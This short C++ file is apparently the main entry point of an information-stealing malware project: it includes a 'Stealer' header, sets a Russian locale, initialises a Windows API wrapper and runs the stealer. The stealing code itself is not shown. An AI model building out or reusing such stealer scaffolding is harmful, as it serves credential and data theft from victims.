#include "stealer/Stealer.h"
#include "winapi.h"


int main() {
    setlocale(LC_ALL, "ru-RU");

    WinApi::Init();

    Stealer().run();

    return 0;
}
